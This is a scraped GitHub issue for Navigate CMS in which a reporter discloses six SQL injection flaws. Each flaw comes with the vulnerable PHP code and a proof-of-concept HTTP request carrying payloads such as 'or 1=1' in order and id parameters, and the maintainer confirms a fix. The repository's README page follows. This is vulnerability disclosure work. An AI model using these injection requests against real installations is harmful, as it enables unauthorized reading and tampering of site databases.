=== Content from github.com_e9ec8bbc_20250114_230114.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNavigateCMS%2FNavigate-CMS%2Fissues%2F26)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNavigateCMS%2FNavigate-CMS%2Fissues%2F26)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=NavigateCMS%2FNavigate-CMS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NavigateCMS](/NavigateCMS)
/
**[Navigate-CMS](/NavigateCMS/Navigate-CMS)**
Public

* [Notifications](/login?return_to=%2FNavigateCMS%2FNavigate-CMS) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2FNavigateCMS%2FNavigate-CMS)
* [Star
   8](/login?return_to=%2FNavigateCMS%2FNavigate-CMS)

* [Code](/NavigateCMS/Navigate-CMS)
* [Issues
  3](/NavigateCMS/Navigate-CMS/issues)
* [Pull requests
  0](/NavigateCMS/Navigate-CMS/pulls)
* [Discussions](/NavigateCMS/Navigate-CMS/discussions)
* [Actions](/NavigateCMS/Navigate-CMS/actions)
* [Projects
  0](/NavigateCMS/Navigate-CMS/projects)
* [Wiki](/NavigateCMS/Navigate-CMS/wiki)
* [Security](/NavigateCMS/Navigate-CMS/security)
* [Insights](/NavigateCMS/Navigate-CMS/pulse)

Additional navigation options

* [Code](/NavigateCMS/Navigate-CMS)
* [Issues](/NavigateCMS/Navigate-CMS/issues)
* [Pull requests](/NavigateCMS/Navigate-CMS/pulls)
* [Discussions](/NavigateCMS/Navigate-CMS/discussions)
* [Actions](/NavigateCMS/Navigate-CMS/actions)
* [Projects](/NavigateCMS/Navigate-CMS/projects)
* [Wiki](/NavigateCMS/Navigate-CMS/wiki)
* [Security](/NavigateCMS/Navigate-CMS/security)
* [Insights](/NavigateCMS/Navigate-CMS/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FNavigateCMS%2FNavigate-CMS%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FNavigateCMS%2FNavigate-CMS%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Multiple SQL Injection Vulnerabilities Identified in the latest version (v2.9.4 r1561) #26

Closed

[Paper-Submission-2021](/Paper-Submission-2021) opened this issue
Jul 22, 2021
· 1 comment

Closed

# [Multiple SQL Injection Vulnerabilities Identified in the latest version (v2.9.4 r1561)](#top) #26

[Paper-Submission-2021](/Paper-Submission-2021) opened this issue
Jul 22, 2021
· 1 comment

## Comments

[![@Paper-Submission-2021](https://avatars.githubusercontent.com/u/81791091?s=80&v=4)](/Paper-Submission-2021)

Copy link

### **[Paper-Submission-2021](/Paper-Submission-2021)** commented [Jul 22, 2021](#issue-950289292)

| Hi, I would like to report 6 SQL Injection vulnerabilities identified in the latest version of the CMS. Vulnerability 1: `block_order` injection at `blocks.php` vulnerable code: `blocks.php`  ```  function run() { 	global $layout; 	global $DB; 	global $website; 	 	$out = ''; 	$item = new block(); 			 	switch($_REQUEST['act']) 	{  		case 'load':         case 'edit': 		case 2: 			if(!empty($_REQUEST['id'])) 			{ 				$item->load(intval($_REQUEST['id']));	 			} 		 			if(isset($_REQUEST['form-sent'])) 			{ 				$item->load_from_post(); 				try 				{                     naviforms::check_csrf_token();  					$item->save();                     property::save_properties_from_post('block', $item->id); 					$id = $item->id;  					// set block order                     if(!empty($item->type) && !empty($_REQUEST['blocks-order']))                     {                         block::reorder($item->type, $_REQUEST['blocks-order'], $_REQUEST['blocks-order-fixed']);   //step into                      }  ```  which triggers `block.class.php`  ``` public static function reorder($type, $order, $fixed) 	{ 		global $DB; 		global $website;  		$item = explode("#", $order);//explore order by '#' 							 		for($i=0; $i < count($item); $i++) 		{		 			if(empty($item[$i]))             {                 continue;             }              $block_is_fixed = ($fixed[$item[$i]]=='1'? '1' : '0');  			$ok = $DB->execute('                 UPDATE nv_blocks 				SET position = '.($i+1).', 				    fixed = '.$block_is_fixed.'                 WHERE id = '.$item[$i].'// trigger here 				  AND website = '.$website->id ```  Attacker can inject in `block-order` through http request. A sample request traffic:  ``` POST /navigate/navigate.php?fid=blocks&act=edit&id=7&tab=1 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------195682555912966620871610644291 Content-Length: 7310 Origin: http://localhost Connection: close Referer: http://localhost/navigate/navigate.php?fid=blocks&act=edit&id&tab=1 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=vp8rDkw03etQUgHzT9FpieSJ5umQS6ZuLBUE2HnrfYgc4eiNLHWQdPZYVJM6; guest_token=IkpPRWlGeWdObThKVGdTQTdqTFZSdWcxNjA4MjgxNzg4ODE2Ig%3D%3D--acb8c6e71d42560c0d4ce4741531f317312a4f8a; navigate-tinymce-scroll=%7B%7D; navigate-remember-user-id=af59694d7163bd32096f6752379642aee3043fc5; navigate-remember-user-token=9%01%B3%0C%C6%BB%0C%0Bb%D9%18%CB%A1n%CB9a%CF%3E%0Fx%D0Q%EFX%C7C%11%DB%D7S%06B%1B%40+%11L%EB%2A%ABr%E1%EE%D2m%DA%B8%B233%0A%05%A8t%C7%3D%9E%FA%B4%03%C13g1%AF%E1%B4%A6%5C%87%3A%08J%A5%D3%C6%BFVZ%18%A0t%D2%E8GG%8B%AD%BE%BC%25yg%EDh%FB%AFtD%16%81%9D%93y%AD%C5%3AuL%FB%E4%88%B6%B4%F78%E8%D2OIA%11%EE%F1%17cj; navigate-language=en; PHPSESSID=17v9et2fl867j0od9hlvj990ab; NVSID_7a6b5d33_421aa90e079fa326b6494f812ad13e79=17v9et2fl867j0od9hlvj990ab Upgrade-Insecure-Requests: 1  -----------------------------195682555912966620871610644291 Content-Disposition: form-data; name="form-sent"  true -----------------------------195682555912966620871610644291 Content-Disposition: form-data; name="id"  7 -----------------------------195682555912966620871610644291 Content-Disposition: form-data; name="_nv_csrf_token" ......  Content-Disposition: form-data; name="blocks-order"  **5 or 1=1**   ```  This can be reflected in the backend database result. Didn't further justify the sql injection outcomes but clearly attacker can do arbitrary sql query. [1_block_sql_injection_sql_result](https://user-images.githubusercontent.com/81791091/126586568-2565e1cc-2318-403f-98a5-1deb98531a4d.png) Vulnerability 2: `id` at `items.php` Vulnerable code `item.php`:  ```  //package/lib/packages/items/items.php function run() { 	global $layout; 	global $DB; 	global $website; 	global $theme; 	global $user; 		 	$out = ''; 	$item = new item(); 			 	switch($_REQUEST['act']) 	{  		case "change_comment_status": // change comment status 			if(empty($_REQUEST['id'])) 			{ 				echo "false";  				core_terminate(); 			} 			 			switch($_REQUEST['opt']) 			{ 				case 'publish': 					$DB->execute(' 						UPDATE nv_comments 						   SET status = 0 						 WHERE website = '.$website->id.' AND 						       id = '.$_REQUEST['id']); 					break; 					 				case 'unpublish': 					$DB->execute(' 						UPDATE nv_comments 						   SET status = 1 						 WHERE website = '.$website->id.' AND 						        id = '.$_REQUEST['id']); 					break; 					 				case 'delete': 					$DB->execute(' 						DELETE FROM nv_comments 						 WHERE website = '.$website->id.' AND 							    id = '.$_REQUEST['id']); 					break; 			}  ```  Attacker can use a traffic similar to:  ``` GET /navigate/navigate.php?fid=items&act=change_comment_status&**id=abc%20or%201=1**&opt=publish HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=vp8rDkw03etQUgHzT9FpieSJ5umQS6ZuLBUE2HnrfYgc4eiNLHWQdPZYVJM6; guest_token=IkpPRWlGeWdObThKVGdTQTdqTFZSdWcxNjA4MjgxNzg4ODE2Ig%3D%3D--acb8c6e71d42560c0d4ce4741531f317312a4f8a; navigate-tinymce-scroll=%7B%7D; navigate-remember-user-id=af59694d7163bd32096f6752379642aee3043fc5; navigate-remember-user-token=9%01%B3%0C%C6%BB%0C%0Bb%D9%18%CB%A1n%CB9a%CF%3E%0Fx%D0Q%EFX%C7C%11%DB%D7S%06B%1B%40+%11L%EB%2A%ABr%E1%EE%D2m%DA%B8%B233%0A%05%A8t%C7%3D%9E%FA%B4%03%C13g1%AF%E1%B4%A6%5C%87%3A%08J%A5%D3%C6%BFVZ%18%A0t%D2%E8GG%8B%AD%BE%BC%25yg%EDh%FB%AFtD%16%81%9D%93y%AD%C5%3AuL%FB%E4%88%B6%B4%F78%E8%D2OIA%11%EE%F1%17cj; navigate-language=en; PHPSESSID=17v9et2fl867j0od9hlvj990ab; NVSID_7a6b5d33_421aa90e079fa326b6494f812ad13e79=17v9et2fl867j0od9hlvj990ab Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0  ``` Vulnerability 3: `products_order` at `products.php` Vulnerable code  ```  //package/lib/packages/products/products.php function run() { 	global $layout; 	global $DB; 	global $website; 	global $theme; 	global $user;  	$out = ''; 	$item = new product(); 			 	switch($_REQUEST['act']) 	{         **case 'products_order':**             if(!empty($_POST['products-order']))             {                 if(naviforms::check_csrf_token('header'))                 {                     // save new order                     $response = product::reorder($_POST['products-order']);                     if($response!==true)                     {                         echo $response['error'];                     }                     else                     {                         echo 'true';                     }                 }             }  ```  Then it triggers  ``` //package/lib/packages/products/product.class.php     public static function reorder($order)     {         global $DB; 		global $website;  		**$items = explode("#", $order);**  		for($i=0; $i < count($items); $i++) 		{ 			if(empty($items[$i]))             {                 continue;             }  			$ok = $DB->execute('               UPDATE nv_products 				 SET position = '.($i+1).' 			   **WHERE id = '.$items[$i].' AND**  			         website = '.$website->id             ); ``` Vulnerability 4: `id` in `products.php` Vulnerable code:  ```  //package/lib/packages/products/products.php         case "change_comment_status": 			if(empty($_REQUEST['id'])) 			{ 				echo "false";  				core_terminate(); 			} 			 			switch($_REQUEST['opt']) 			{ 				case 'publish': 					$DB->execute(' 						UPDATE nv_comments 						   SET status = 0 						 WHERE website = '.$website->id.' AND 						       id = '.$_REQUEST['id']); 					break; 					 				case 'unpublish': 					$DB->execute(' 						UPDATE nv_comments 						   SET status = 1 						 WHERE website = '.$website->id.' AND 						       id = '.$_REQUEST['id']); 					break; 					 				case 'delete': 					$DB->execute(' 						DELETE FROM nv_comments 						WHERE website = '.$website->id.' AND 							   id = '.$_REQUEST['id']); 					break; 			}  ```  Attacker can easily craft something like this to trigger the vulnerability  ``` http://localhost/navigate/navigate.php?fid=products&act=change_comment_status&id=1%20or%201=1;&opt=publish  ``` Vulnerability 5: `property::reorder` at `templates.php` vulnerable code:  ```  //package/lib/packages/templates/templates.php 		case 'load': 		case 2: // edit/new form		 			if(!empty($_REQUEST['id'])) 			{                 if(is_numeric($_REQUEST['id']))                 {                     $item->load(intval($_REQUEST['id']));                 }                 else                 {                     $item->load_from_theme($_REQUEST['id']);                 } 			} 		 			if(isset($_REQUEST['form-sent'])) 			{ 				try 				{                     $item->load_from_post();                     naviforms::check_csrf_token();  					$item->save(); 					if(!empty($_REQUEST['property-enabled']))                     {                         $enableds = array_values($_REQUEST['property-enabled']);                     } 					else                     {                         $enableds = array();                     } 					property::reorder("template", $item->id, $_REQUEST['template-properties-order'], $enableds);  ```  Then step into  ``` //package/lib/packages/properties/property.class.php 	public static function reorder($element, $template, $order, $enableds=NULL) 	{ 		global $DB; 		global $website; 		 		**$item = explode("#", $order);** 							 		for($i=0; $i < count($item); $i++) 		{		 			if(empty($item[$i])) continue;  			$enabled = '';			 			if(is_array($enableds)) 			{ 				$enabled = ', enabled = 0 '; 				for($e=0; $e < count($enableds); $e++) 				{ 					if($enableds[$e]==$item[$i]) $enabled = ', enabled = 1 '; 				} 			} 			 			$ok =	$DB->execute('                 UPDATE nv_properties 				   SET position = '.($i+1).' '.$enabled.'  				 **WHERE id = '.$item[$i].'** 				   AND website = '.$website->id             );  ``` Vulnerability 6: `children_order` at `structure.php` Vulnerable code:  ``` //package/lib/packages/structure/structure.php 		case "reorder": 			**$ok = structure::reorder($_REQUEST['parent'], $_REQUEST['children_order']);** 			echo json_encode($ok); 			core_terminate(); 			break; ```  Then steps into  ``` //package/lib/packages/structure/structure.class.php 	public static function reorder($parent, $children) 	{ 		global $DB; 		global $website; 		 		**$children = explode("#", $children);** 				 		for($i=0; $i < count($children); $i++) 		{		 			if(empty($children[$i]))             {                 continue;             }  			$ok =	$DB->execute('UPDATE nv_structure  									 SET position = '.($i+1).' 								   **WHERE id = '.$children[$i].'**  									 AND parent = '.intval($parent).' 									 AND website = '.$website->id); 							  			if(!$ok)             {                 return array("error" => $DB->get_last_error());             } 		} 			 		return true;	 	} ```  Attacker can easily craft a traffic as below to cause the injection: `http://localhost/navigate/navigate.php?fid=structure&act=reorder&parent=1&children=abc%20or%201=1` |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@NavigateCMS](https://avatars.githubusercontent.com/u/1115546?s=80&v=4)](/NavigateCMS)

Copy link

Owner

### **[NavigateCMS](/NavigateCMS)** commented [Jul 24, 2021](#issuecomment-886008617)

| Thank you! Fixed by [ed3f70b](https://github.com/NavigateCMS/Navigate-CMS/commit/ed3f70b0083f1c2af66e9d71874619824e01350e) |
| --- |

All reactions

Sorry, something went wrong.

[![@NavigateCMS](https://avatars.githubusercontent.com/u/1115546?s=40&v=4)](/NavigateCMS)
[NavigateCMS](/NavigateCMS)
closed this as [completed](/NavigateCMS/Navigate-CMS/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jul 24, 2021](#event-5063763624)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FNavigateCMS%2FNavigate-CMS%2Fissues%2F26)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@NavigateCMS](https://avatars.githubusercontent.com/u/1115546?s=52&v=4)](/NavigateCMS) [![@Paper-Submission-2021](https://avatars.githubusercontent.com/u/81791091?s=52&v=4)](/Paper-Submission-2021)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_497c0ef3_20250114_230113.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNavigateCMS%2FNavigate-CMS)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNavigateCMS%2FNavigate-CMS)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=NavigateCMS%2FNavigate-CMS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NavigateCMS](/NavigateCMS)
/
**[Navigate-CMS](/NavigateCMS/Navigate-CMS)**
Public

* [Notifications](/login?return_to=%2FNavigateCMS%2FNavigate-CMS) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2FNavigateCMS%2FNavigate-CMS)
* [Star
   8](/login?return_to=%2FNavigateCMS%2FNavigate-CMS)

Navigate CMS, a very powerful open source content management system for everybody.

[www.navigatecms.com](http://www.navigatecms.com "http://www.navigatecms.com")

### License

[GPL-2.0 license](/NavigateCMS/Navigate-CMS/blob/master/LICENSE.txt)

[8
stars](/NavigateCMS/Navigate-CMS/stargazers) [4
forks](/NavigateCMS/Navigate-CMS/forks) [Branches](/NavigateCMS/Navigate-CMS/branches) [Tags](/NavigateCMS/Navigate-CMS/tags) [Activity](/NavigateCMS/Navigate-CMS/activity)
 [Star](/login?return_to=%2FNavigateCMS%2FNavigate-CMS)

 [Notifications](/login?return_to=%2FNavigateCMS%2FNavigate-CMS) You must be signed in to change notification settings

* [Code](/NavigateCMS/Navigate-CMS)
* [Issues
  3](/NavigateCMS/Navigate-CMS/issues)
* [Pull requests
  0](/NavigateCMS/Navigate-CMS/pulls)
* [Discussions](/NavigateCMS/Navigate-CMS/discussions)
* [Actions](/NavigateCMS/Navigate-CMS/actions)
* [Projects
  0](/NavigateCMS/Navigate-CMS/projects)
* [Wiki](/NavigateCMS/Navigate-CMS/wiki)
* [Security](/NavigateCMS/Navigate-CMS/security)
* [Insights](/NavigateCMS/Navigate-CMS/pulse)

Additional navigation options

* [Code](/NavigateCMS/Navigate-CMS)
* [Issues](/NavigateCMS/Navigate-CMS/issues)
* [Pull requests](/NavigateCMS/Navigate-CMS/pulls)
* [Discussions](/NavigateCMS/Navigate-CMS/discussions)
* [Actions](/NavigateCMS/Navigate-CMS/actions)
* [Projects](/NavigateCMS/Navigate-CMS/projects)
* [Wiki](/NavigateCMS/Navigate-CMS/wiki)
* [Security](/NavigateCMS/Navigate-CMS/security)
* [Insights](/NavigateCMS/Navigate-CMS/pulse)

# NavigateCMS/Navigate-CMS

    master[Branches](/NavigateCMS/Navigate-CMS/branches)[Tags](/NavigateCMS/Navigate-CMS/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1,629 Commits](/NavigateCMS/Navigate-CMS/commits/master/) | | |
| [cfg](/NavigateCMS/Navigate-CMS/tree/master/cfg "cfg") | | [cfg](/NavigateCMS/Navigate-CMS/tree/master/cfg "cfg") |  |  |
| [css](/NavigateCMS/Navigate-CMS/tree/master/css "css") | | [css](/NavigateCMS/Navigate-CMS/tree/master/css "css") |  |  |
| [img](/NavigateCMS/Navigate-CMS/tree/master/img "img") | | [img](/NavigateCMS/Navigate-CMS/tree/master/img "img") |  |  |
| [js](/NavigateCMS/Navigate-CMS/tree/master/js "js") | | [js](/NavigateCMS/Navigate-CMS/tree/master/js "js") |  |  |
| [lib](/NavigateCMS/Navigate-CMS/tree/master/lib "lib") | | [lib](/NavigateCMS/Navigate-CMS/tree/master/lib "lib") |  |  |
| [plugins](/NavigateCMS/Navigate-CMS/tree/master/plugins "plugins") | | [plugins](/NavigateCMS/Navigate-CMS/tree/master/plugins "plugins") |  |  |
| [private](/NavigateCMS/Navigate-CMS/tree/master/private "private") | | [private](/NavigateCMS/Navigate-CMS/tree/master/private "private") |  |  |
| [setup](/NavigateCMS/Navigate-CMS/tree/master/setup "setup") | | [setup](/NavigateCMS/Navigate-CMS/tree/master/setup "setup") |  |  |
| [web](/NavigateCMS/Navigate-CMS/tree/master/web "web") | | [web](/NavigateCMS/Navigate-CMS/tree/master/web "web") |  |  |
| [.gitignore](/NavigateCMS/Navigate-CMS/blob/master/.gitignore ".gitignore") | | [.gitignore](/NavigateCMS/Navigate-CMS/blob/master/.gitignore ".gitignore") |  |  |
| [.htaccess](/NavigateCMS/Navigate-CMS/blob/master/.htaccess ".htaccess") | | [.htaccess](/NavigateCMS/Navigate-CMS/blob/master/.htaccess ".htaccess") |  |  |
| [LICENSE.txt](/NavigateCMS/Navigate-CMS/blob/master/LICENSE.txt "LICENSE.txt") | | [LICENSE.txt](/NavigateCMS/Navigate-CMS/blob/master/LICENSE.txt "LICENSE.txt") |  |  |
| [README](/NavigateCMS/Navigate-CMS/blob/master/README "README") | | [README](/NavigateCMS/Navigate-CMS/blob/master/README "README") |  |  |
| [SECURITY.md](/NavigateCMS/Navigate-CMS/blob/master/SECURITY.md "SECURITY.md") | | [SECURITY.md](/NavigateCMS/Navigate-CMS/blob/master/SECURITY.md "SECURITY.md") |  |  |
| [crossdomain.xml](/NavigateCMS/Navigate-CMS/blob/master/crossdomain.xml "crossdomain.xml") | | [crossdomain.xml](/NavigateCMS/Navigate-CMS/blob/master/crossdomain.xml "crossdomain.xml") |  |  |
| [favicon.ico](/NavigateCMS/Navigate-CMS/blob/master/favicon.ico "favicon.ico") | | [favicon.ico](/NavigateCMS/Navigate-CMS/blob/master/favicon.ico "favicon.ico") |  |  |
| [index.php](/NavigateCMS/Navigate-CMS/blob/master/index.php "index.php") | | [index.php](/NavigateCMS/Navigate-CMS/blob/master/index.php "index.php") |  |  |
| [login.php](/NavigateCMS/Navigate-CMS/blob/master/login.php "login.php") | | [login.php](/NavigateCMS/Navigate-CMS/blob/master/login.php "login.php") |  |  |
| [navigate.php](/NavigateCMS/Navigate-CMS/blob/master/navigate.php "navigate.php") | | [navigate.php](/NavigateCMS/Navigate-CMS/blob/master/navigate.php "navigate.php") |  |  |
| [navigate\_download.php](/NavigateCMS/Navigate-CMS/blob/master/navigate_download.php "navigate_download.php") | | [navigate\_download.php](/NavigateCMS/Navigate-CMS/blob/master/navigate_download.php "navigate_download.php") |  |  |
| [navigate\_info.php](/NavigateCMS/Navigate-CMS/blob/master/navigate_info.php "navigate_info.php") | | [navigate\_info.php](/NavigateCMS/Navigate-CMS/blob/master/navigate_info.php "navigate_info.php") |  |  |
| [navigate\_upload.php](/NavigateCMS/Navigate-CMS/blob/master/navigate_upload.php "navigate_upload.php") | | [navigate\_upload.php](/NavigateCMS/Navigate-CMS/blob/master/navigate_upload.php "navigate_upload.php") |  |  |
| View all files | | |

## Repository files navigation

* README
* GPL-2.0 license
* Security
```
Navigate CMS
============

A powerful and intuitive content management system for everybody.

The easiest way to keep your website updated.

Documentation
-------------

Full application documentation can be found on the official website.

<http://www.navigatecms.com>

Demo
----

You can try Navigate CMS online:

<http://demo.navigatecms.com/navigate/demo.php?lang=en>

Bug tracker
-----------

Found a bug? Please create an issue on Github!

<https://github.com/NavigateCMS/Navigate-CMS/issues>

Support
-------

Have a question? Ask on Questions & Answers section of Navigate CMS website!

<http://www.navigatecms.com/en/questions>

Project manager
---------------

Marc Lobato <info@navigatecms.com>

Copyright and license
---------------------

Copyright 2010-2023 Naviwebs S.C.

This software is licensed under the GNU General Public License version 2 (the "GPL License").

You may obtain a copy of the GPL License in the LICENSE file, or at:

<http://www.gnu.org/licenses/gpl-2.0.html>

Unless required by applicable law or agreed to in writing, software distributed under the GPL License
is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,
either express or implied. See the GPL License for the specific language governing
permissions and limitations under the GPL License.
```

## About

Navigate CMS, a very powerful open source content management system for everybody.

[www.navigatecms.com](http://www.navigatecms.com "http://www.navigatecms.com")

### Topics

[cms](/topics/cms "Topic: cms")
[content](/topics/content "Topic: content")
[ecommerce](/topics/ecommerce "Topic: ecommerce")
[websites](/topics/websites "Topic: websites")
[multiwebsite](/topics/multiwebsite "Topic: multiwebsite")

### Resources

[Readme](#readme-ov-file)
### License

[GPL-2.0 license](#GPL-2.0-1-ov-file)
### Security policy

[Security policy](#security-ov-file)

[Activity](/NavigateCMS/Navigate-CMS/activity)
### Stars

[**8**
stars](/NavigateCMS/Navigate-CMS/stargazers)
### Watchers

[**5**
watching](/NavigateCMS/Navigate-CMS/watchers)
### Forks

[**4**
forks](/NavigateCMS/Navigate-CMS/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FNavigateCMS%2FNavigate-CMS&report=NavigateCMS+%28user%29)

## [Releases 1](/NavigateCMS/Navigate-CMS/releases)

[(latest release)
Latest

